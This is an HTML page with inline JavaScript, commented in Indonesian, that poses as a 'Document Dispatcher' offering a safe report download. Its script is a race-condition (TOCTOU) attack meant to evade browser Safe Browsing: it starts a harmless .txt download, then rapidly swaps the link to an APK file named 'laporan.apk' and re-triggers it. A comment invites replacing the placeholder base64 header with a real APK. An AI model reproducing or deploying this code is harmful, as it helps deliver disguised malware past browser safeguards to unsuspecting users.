<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Document Archive</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #090d16; color: #f8fafc;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center;
  }
  .panel { background: #111827; padding: 30px; border-radius: 12px; border: 1px solid #1f2937; max-width: 400px; width: 100%; }
  h2 { color: #3b82f6; margin-bottom: 10px; }
  p { color: #9ca3af; font-size: 14px; margin-bottom: 20px; }
  button {
    padding: 15px; background: #3b82f6; color: #fff;
    border: none; border-radius: 8px; cursor: pointer;
    width: 100%; font-size: 16px; font-weight: bold;
  }
  button:hover { background: #2563eb; }
  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #38bdf8; font-size: 13px; font-family: monospace; }
</style>
</head>
<body>

<div class="panel">
  <h2>📄 Document Dispatcher</h2>
  <p>Mengunduh laporan (.txt) secara aman...</p>
  <button id="startBtn">Download Laporan</button>
  <div id="status">Sistem siap.</div>
</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');

  // ============================================
  // 1. PERSIAPAN PAYLOAD
  // ============================================
  
  // A. File Aman (TXT)
  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware di sini.";
  var safeBlob = new Blob([safeContent], { type: 'text/plain' });
  var safeUrl = URL.createObjectURL(safeBlob);

  // B. File Jahat (APK Base64)
  // Header ZIP/APK (PK..) - Ganti dengan Base64 APK asli jika ada
  var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
  var binary = atob(b64Apk);
  var bytes = new Uint8Array(binary.length);
  for (var i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  // MIME Type APK
  var maliciousBlob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
  var maliciousUrl = URL.createObjectURL(maliciousBlob);

  // ============================================
  // 2. RACE CONDITION (TOCTOU)
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    statusEl.innerText = "Memulai Race Condition...";

    // A. Buat elemen <a>
    var a = document.createElement('a');
    a.style.display = 'none';
    document.body.appendChild(a);

    // B. Set Awal: File TXT
    a.href = safeUrl;
    a.download = 'laporan.txt';
    
    // C. Picu Unduhan (Safe Browsing akan memeriksa TXT ini)
    a.click();

    // D. TOCTOU: Ubah href dan download secara instan
    // Kita menggunakan queueMicrotask untuk mengeksekusi perubahan
    // TEPAT setelah click() selesai, sebelum browser sempat memproses file.
    
    var attempts = 0;
    
    function mutateLink() {
      attempts++;
      
      // Ganti ke file APK
      a.href = maliciousUrl;
      a.download = 'laporan.apk';
      
      // Trigger ulang
      a.click();

      if (attempts < 10) {
        // Gunakan setTimeout 0ms (macro task) untuk memberikan jeda satu tick
        // agar browser sempat mendaftarkan unduhan pertama.
        setTimeout(mutateLink, 0); 
      } else {
        // Cleanup
        setTimeout(function() {
          document.body.removeChild(a);
          URL.revokeObjectURL(safeUrl);
          URL.revokeObjectURL(maliciousUrl);
          statusEl.innerText = "Selesai. Cek folder Downloads.";
        }, 5000);
      }
    }

    // Mulai loop mutasi
    // Gunakan queueMicrotask atau setTimeout 0 untuk memulai race
    queueMicrotask(mutateLink);

  });

})();
</script>
</body>
</html>
